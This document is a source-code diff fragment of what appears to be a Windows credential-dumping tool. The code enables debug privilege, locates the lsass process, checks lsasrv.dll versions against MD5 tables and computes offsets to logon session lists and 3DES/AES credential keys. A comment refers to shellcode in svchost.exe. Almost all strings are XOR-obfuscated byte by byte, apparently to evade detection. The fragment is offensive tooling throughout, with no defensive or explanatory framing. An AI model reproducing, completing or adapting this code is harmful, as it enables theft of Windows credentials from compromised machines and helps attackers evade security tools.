+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
+	if (FBFileExists(_fuckingstring)) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
+		DeleteFileA(_fuckingstring);
+
+	}
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+	if (FBFileExists(_fuckingstring)) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+		DeleteFileA(_fuckingstring);
+
+	}
 
 
 
 
 
-// credential
-
-char* asdasdasdasd = (char*)malloc(123);
-
-ZeroMemory(asdasdasdasd, 123);
 
 
 
-char* readlyversionnumber = (char*)malloc(123);
 
-ZeroMemory(readlyversionnumber, 123);
 
-int counterrerer = 0;
 
-memcpy_s(asdasdasdasd, 123, res, strlen(res));
+	EnableDebugPrivilege();
 
-for (int i = 0; i < strlen(asdasdasdasd); i++) {
+	DWORD pid = GetLsassPid();
 
-	if (asdasdasdasd[i] == '.') {
+	// lsasrv.dll3
 
-		counterrerer++;
+	char* res = (char*)malloc(50);
+
+	ZeroMemory(res, 50);
+
+	getosversion(res);
+
+	//printf("%s\n", res);
 
 		// 
 
-		if (counterrerer == 2) {
+	for (int i = 0; i < 1234; i++) {
 
-			int asdasdcounasdasdasdasd = 0;
+		if (res[i] == ' ') {
 
-			for (int j = i + 1;; j++) {
+			// 
 
-				asdasdcounasdasdasdasd++;
+			res[i] = '\0'; break;
 
-				if (asdasdasdasd[j] == '.') {
+		}
 
-					break;
+	}
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 43; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 119; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 104; _fuckingstring[9] = 110; _fuckingstring[10] = 111; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
+	printf(_fuckingstring, res);
+
+
+
+
+
+	// credential
+
+	char* asdasdasdasd = (char*)malloc(123);
+
+	ZeroMemory(asdasdasdasd, 123);
+
+
+
+	char* readlyversionnumber = (char*)malloc(123);
+
+	ZeroMemory(readlyversionnumber, 123);
+
+	int counterrerer = 0;
+#ifdef wotamaxiangshuijiaoa
+	printf("asdasdasdasd  111111111111 %s\n", asdasdasdasd);
+#endif // wotamaxiangshuijiaoa
+
+	memcpy_s(asdasdasdasd, 123, res, strlen(res));
+
+	for (int i = 0; i < strlen(asdasdasdasd); i++) {
+
+		if (asdasdasdasd[i] == '.') {
+
+			counterrerer++;
+
+			// 
+
+			if (counterrerer == 2) {
+
+				int asdasdcounasdasdasdasd = 0;
+
+				for (int j = i + 1;; j++) {
+
+					asdasdcounasdasdasdasd++;
+
+					if (asdasdasdasd[j] == '.') {
+
+						break;
+
+					}
 
 				}
 
+				memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd - 1);
+
 			}
 
-			memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd - 1);
-
 		}
 
 	}
 
-}
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 116; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 101; _fuckingstring[5] = 33; _fuckingstring[6] = 119; _fuckingstring[7] = 100; _fuckingstring[8] = 115; _fuckingstring[9] = 114; _fuckingstring[10] = 104; _fuckingstring[11] = 110; _fuckingstring[12] = 111; _fuckingstring[13] = 59; _fuckingstring[14] = 33; _fuckingstring[15] = 36; _fuckingstring[16] = 114; _fuckingstring[17] = 11; _fuckingstring[18] = 1; FBXorCrypt(_fuckingstring, 19);
+	printf(_fuckingstring, readlyversionnumber);
 
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 116; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 101; _fuckingstring[5] = 33; _fuckingstring[6] = 119; _fuckingstring[7] = 100; _fuckingstring[8] = 115; _fuckingstring[9] = 114; _fuckingstring[10] = 104; _fuckingstring[11] = 110; _fuckingstring[12] = 111; _fuckingstring[13] = 59; _fuckingstring[14] = 33; _fuckingstring[15] = 36; _fuckingstring[16] = 114; _fuckingstring[17] = 11; _fuckingstring[18] = 1; FBXorCrypt(_fuckingstring, 19);
-printf(_fuckingstring, readlyversionnumber);
+	int maxpowenum = strlen(readlyversionnumber) - 1;
 
-int maxpowenum = strlen(readlyversionnumber) - 1;
+	int finalnumber = 0;
 
-int finalnumber = 0;
+	int oi = 0;
 
-int oi = 0;
+	for (int i = 0; i < maxpowenum; i++) {
 
-for (int i = 0; i < maxpowenum; i++) {
+		int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);
 
-	int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);
-
-	finalnumber += temp;
-
-}
-
-finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
-
-int _build_version = finalnumber;
-
-
-
-
-
-int offset____ = 0;
-
-if (_build_version < 3000) {
-
-	offset____ = 0x70;
-
-}
-
-else if (_build_version < 5000) {
-
-	offset____ = 0x70;
-
-}
-
-else if (_build_version < 7000) {
-
-	offset____ = 0xd8;
-
-}
-
-else if (_build_version < 8000) {
-
-	offset____ = 0xd8;
-
-}
-
-else if (_build_version < 9400) {
-
-	offset____ = 0xf8;
-
-}
-
-else {
-
-	offset____ = 0x108;
-
-}
-
-// lsasrv.dllntheader
-
-// dlllsasrvdll
-
-//unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("C:\\windows\\system32\\lsasrv.dll");
-
-//DWORD error = (unsigned int)GetLastError();
-
-//if (lsasrvLocal == (unsigned char*)0) {
-
-//	//printf("[x] load module failed, abort...\n");
-
-
-
-//	char fixed2s3[123] = "[x] load module failed, abort...\n";
-
-//	fwrite(fixed2s3, 1, strlen(fixed2s3), file);
-
-//	return 1;
-
-//}
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
-HANDLE asdasdhFile = CreateFileA(_fuckingstring,                // name of the write
-
-	GENERIC_READ,          // open for writing
-
-	0,                      // do not share
-
-	NULL,                   // default security
-
-	OPEN_EXISTING,             // create new file only
-
-	FILE_ATTRIBUTE_NORMAL,  // normal file
-
-	NULL);                  // no attr. template
-
-if (asdasdhFile == INVALID_HANDLE_VALUE) {
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 121; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 115; _fuckingstring[5] = 100; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 33; _fuckingstring[9] = 108; _fuckingstring[10] = 110; _fuckingstring[11] = 101; _fuckingstring[12] = 116; _fuckingstring[13] = 109; _fuckingstring[14] = 100; _fuckingstring[15] = 33; _fuckingstring[16] = 103; _fuckingstring[17] = 96; _fuckingstring[18] = 104; _fuckingstring[19] = 109; _fuckingstring[20] = 100; _fuckingstring[21] = 101; _fuckingstring[22] = 45; _fuckingstring[23] = 33; _fuckingstring[24] = 96; _fuckingstring[25] = 99; _fuckingstring[26] = 110; _fuckingstring[27] = 115; _fuckingstring[28] = 117; _fuckingstring[29] = 47; _fuckingstring[30] = 47; _fuckingstring[31] = 47; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
-	printf(_fuckingstring);
-
-
-
-	//	char fixed2s3[123] = "[x] read module failed, abort...\n";
-
-		//fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);
-
-	return 1;
-
-}
-
-BYTE* ReadBufferasdasd = (BYTE*)malloc(0x1000); DWORD ol = 0;
-
-ReadFile(asdasdhFile, ReadBufferasdasd, 0x1000, &ol, NULL);//) )
-
-BYTE* lsasrvLocal = ReadBufferasdasd;
-
-IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)lsasrvLocal;
-
-if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
-
-	return 1;
-
-}
-
-IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)lsasrvLocal + idh->e_lfanew);
-
-
-
-// 
-
-if (_build_version > 7000 && _build_version < 9400 && nt_headers->FileHeader.TimeDateStamp>0x53480000) {
-
-	offset____ = 0xe8;
-
-}
-
-
-
-DWORD offset = 0;
-
-for (int i = 0; i < TABLE_LENGTH; i++) {
-
-	if (strcmp(res, version_table[i]) == 0) {
-
-		// md5
-
-		// lsasrv.dll
-
-		// lsasrv.dllmd5
-
-		ZeroMemory(_final_md5_hash, 33);
-
-		if (!mainMD5()) {
-
-			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 103; _fuckingstring[5] = 96; _fuckingstring[6] = 104; _fuckingstring[7] = 109; _fuckingstring[8] = 100; _fuckingstring[9] = 101; _fuckingstring[10] = 45; _fuckingstring[11] = 33; _fuckingstring[12] = 96; _fuckingstring[13] = 99; _fuckingstring[14] = 110; _fuckingstring[15] = 115; _fuckingstring[16] = 117; _fuckingstring[17] = 47; _fuckingstring[18] = 47; _fuckingstring[19] = 47; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-			printf(_fuckingstring); exit(-1);
-
-		}
-
-		if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {
-
-			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 108; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 108; _fuckingstring[8] = 96; _fuckingstring[9] = 117; _fuckingstring[10] = 98; _fuckingstring[11] = 105; _fuckingstring[12] = 45; _fuckingstring[13] = 33; _fuckingstring[14] = 98; _fuckingstring[15] = 110; _fuckingstring[16] = 111; _fuckingstring[17] = 117; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 116; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 114; _fuckingstring[24] = 100; _fuckingstring[25] = 96; _fuckingstring[26] = 115; _fuckingstring[27] = 98; _fuckingstring[28] = 105; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 102; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
-			printf(_fuckingstring); continue;
-
-		}
-
-		offset = 1;
-
-		// svchost.exeshellcode
-
-		char write_out[123] = { 0 };
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 50; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out, 123, _fuckingstring, i);
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 54; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3, 120, _fuckingstring, pid);
-
-
-
-		// _offset_tableindex
-
-		// logonsessionlist3desaescredentiallogonsessionlist
-
-		//   3bytes  
-
-		// 7lsass pid
-
-		// 80816
-
-		// 8   432
-
-
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3 + 7, 123, _fuckingstring, _offset_table[i][0]);
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3 + 7 + 8, 123, _fuckingstring, _offset_table[i][1]);
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3 + 7 + 8 + 8, 123, _fuckingstring, _offset_table[i][2]);
-
-		// credential offset
-
-	//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
-
-		// 
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, _fuckingstring, offset____);
-
-		// 
-
-			// _3des_aes_len_offset   windows10windows7
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 51; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
-		sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, _fuckingstring, _offset_table[i][4]);
-
-
-
-		// 
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 114; _fuckingstring[2] = 1; FBXorCrypt(_fuckingstring, 3);
-		sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8 + 2, 123, _fuckingstring, res);
-
-
-
-
-
-		FILE* fptr;
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
-		if (FBFileExists(_fuckingstring))DeleteFileA(_fuckingstring);
-
-		// Open a file in writing mode
-
-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
-		fopen_s(&fptr, _fuckingstring, "w");
-
-
-
-		// Write some text to the file
-
-		fprintf(fptr, write_out);
-
-
-
-		// Close the file
-
-		fclose(fptr);
-
-		break;
+		finalnumber += temp;
 
 	}
 
-}
+	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
 
-if (!offset) {
+	int _build_version = finalnumber;
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 44; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 116; _fuckingstring[5] = 111; _fuckingstring[6] = 106; _fuckingstring[7] = 111; _fuckingstring[8] = 110; _fuckingstring[9] = 118; _fuckingstring[10] = 111; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 100; _fuckingstring[14] = 115; _fuckingstring[15] = 114; _fuckingstring[16] = 104; _fuckingstring[17] = 110; _fuckingstring[18] = 111; _fuckingstring[19] = 33; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 33; _fuckingstring[23] = 111; _fuckingstring[24] = 110; _fuckingstring[25] = 33; _fuckingstring[26] = 108; _fuckingstring[27] = 101; _fuckingstring[28] = 52; _fuckingstring[29] = 33; _fuckingstring[30] = 108; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 98; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 101; _fuckingstring[37] = 45; _fuckingstring[38] = 33; _fuckingstring[39] = 96; _fuckingstring[40] = 99; _fuckingstring[41] = 110; _fuckingstring[42] = 115; _fuckingstring[43] = 117; _fuckingstring[44] = 47; _fuckingstring[45] = 47; _fuckingstring[46] = 47; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
-	printf(_fuckingstring);
 
-	free(res);
 
-	// 
+
+
+	int offset____ = 0;
+
+	if (_build_version < 3000) {
+
+		offset____ = 0x70;
+
+	}
+
+	else if (_build_version < 5000) {
+
+		offset____ = 0x70;
+
+	}
+
+	else if (_build_version < 7000) {
+
+		offset____ = 0xd8;
+
+	}
+
+	else if (_build_version < 8000) {
+
+		offset____ = 0xd8;
+
+	}
+
+	else if (_build_version < 9400) {
+
+		offset____ = 0xf8;
+
+	}
+
+	else {
+
+		offset____ = 0x108;
+
+	}
+
+	// lsasrv.dllntheader
+
+	// dlllsasrvdll
+
+	//unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("C:\\windows\\system32\\lsasrv.dll");
+
+	//DWORD error = (unsigned int)GetLastError();
+
+	//if (lsasrvLocal == (unsigned char*)0) {
+
+	//	//printf("[x] load module failed, abort...\n");
+
+
+
+	//	char fixed2s3[123] = "[x] load module failed, abort...\n";
+
+	//	fwrite(fixed2s3, 1, strlen(fixed2s3), file);
+
+	//	return 1;
+
+	//}
 
 	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
-	//char PasdadsaATH[1024] = _fuckingstring;
+	HANDLE asdasdhFile = CreateFileA(_fuckingstring,                // name of the write
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 56; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 51; _fuckingstring[20] = 1; FBXorCrypt(_fuckingstring, 21);
-	char PasdadsaATH2[100];
-	memcpy(PasdadsaATH2, _fuckingstring, 100);
+		GENERIC_READ,          // open for writing
 
-	if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);
+		0,                      // do not share
 
-	CopyFileA(_fuckingstring, PasdadsaATH2, FALSE);
+		NULL,                   // default security
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 104; _fuckingstring[2] = 109; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 98; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 104; _fuckingstring[9] = 100; _fuckingstring[10] = 101; _fuckingstring[11] = 33; _fuckingstring[12] = 117; _fuckingstring[13] = 110; _fuckingstring[14] = 33; _fuckingstring[15] = 113; _fuckingstring[16] = 116; _fuckingstring[17] = 99; _fuckingstring[18] = 109; _fuckingstring[19] = 104; _fuckingstring[20] = 98; _fuckingstring[21] = 33; _fuckingstring[22] = 103; _fuckingstring[23] = 110; _fuckingstring[24] = 109; _fuckingstring[25] = 101; _fuckingstring[26] = 100; _fuckingstring[27] = 115; _fuckingstring[28] = 33; _fuckingstring[29] = 38; _fuckingstring[30] = 56; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 51; _fuckingstring[34] = 38; _fuckingstring[35] = 45; _fuckingstring[36] = 113; _fuckingstring[37] = 109; _fuckingstring[38] = 100; _fuckingstring[39] = 96; _fuckingstring[40] = 114; _fuckingstring[41] = 100; _fuckingstring[42] = 33; _fuckingstring[43] = 115; _fuckingstring[44] = 100; _fuckingstring[45] = 117; _fuckingstring[46] = 115; _fuckingstring[47] = 104; _fuckingstring[48] = 100; _fuckingstring[49] = 119; _fuckingstring[50] = 100; _fuckingstring[51] = 33; _fuckingstring[52] = 104; _fuckingstring[53] = 117; _fuckingstring[54] = 11; _fuckingstring[55] = 1; FBXorCrypt(_fuckingstring, 56);
-	printf(_fuckingstring);
+		OPEN_EXISTING,             // create new file only
+
+		FILE_ATTRIBUTE_NORMAL,  // normal file
+
+		NULL);                  // no attr. template
+
+	if (asdasdhFile == INVALID_HANDLE_VALUE) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 121; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 115; _fuckingstring[5] = 100; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 33; _fuckingstring[9] = 108; _fuckingstring[10] = 110; _fuckingstring[11] = 101; _fuckingstring[12] = 116; _fuckingstring[13] = 109; _fuckingstring[14] = 100; _fuckingstring[15] = 33; _fuckingstring[16] = 103; _fuckingstring[17] = 96; _fuckingstring[18] = 104; _fuckingstring[19] = 109; _fuckingstring[20] = 100; _fuckingstring[21] = 101; _fuckingstring[22] = 45; _fuckingstring[23] = 33; _fuckingstring[24] = 96; _fuckingstring[25] = 99; _fuckingstring[26] = 110; _fuckingstring[27] = 115; _fuckingstring[28] = 117; _fuckingstring[29] = 47; _fuckingstring[30] = 47; _fuckingstring[31] = 47; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
+		printf(_fuckingstring);
+
+
+
+		//	char fixed2s3[123] = "[x] read module failed, abort...\n";
+
+			//fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);
+
+		return 1;
+
+	}
+
+	BYTE* ReadBufferasdasd = (BYTE*)malloc(0x1000); DWORD ol = 0;
+
+	ReadFile(asdasdhFile, ReadBufferasdasd, 0x1000, &ol, NULL);//) )
+
+	BYTE* lsasrvLocal = ReadBufferasdasd;
+
+	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)lsasrvLocal;
+
+	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+
+		return 1;
+
+	}
+
+	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)lsasrvLocal + idh->e_lfanew);
+
+
 
 	// 
+
+	if (_build_version > 7000 && _build_version < 9400 && nt_headers->FileHeader.TimeDateStamp>0x53480000) {
+
+		offset____ = 0xe8;
+
+	}
+
+
+
+
+
+	DWORD offset = 0;
+
+#ifdef wotamaxiangshuijiaoa
+	printf("asdasdasdasd  22222222222222 %s\n", asdasdasdasd);
+#endif // wotamaxiangshuijiaoa
+#ifdef wotamaxiangshuijiaoa
+	printf("otamaxiangshuiaji  RESSSSS  %s\n", res);
+#endif // wotamaxiangshuijiaoa
+	for (int i = 0; i < TABLE_LENGTH; i++) {
+		if (0 == version_table[i])break;
+#ifdef wotamaxiangshuijiaoa
+		printf("otamaxiangshuiaji   %s\n", version_table[i]);
+#endif // wotamaxiangshuijiaoa
+		if (strcmp(res, version_table[i]) == 0) {
+
+			// md5
+
+			// lsasrv.dll
+
+			// lsasrv.dllmd5
+
+			ZeroMemory(_final_md5_hash, 33);
+
+			if (!mainMD5()) {
+
+				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 103; _fuckingstring[5] = 96; _fuckingstring[6] = 104; _fuckingstring[7] = 109; _fuckingstring[8] = 100; _fuckingstring[9] = 101; _fuckingstring[10] = 45; _fuckingstring[11] = 33; _fuckingstring[12] = 96; _fuckingstring[13] = 99; _fuckingstring[14] = 110; _fuckingstring[15] = 115; _fuckingstring[16] = 117; _fuckingstring[17] = 47; _fuckingstring[18] = 47; _fuckingstring[19] = 47; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+				printf(_fuckingstring); exit(-1);
+
+			}
+
+			if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {
+
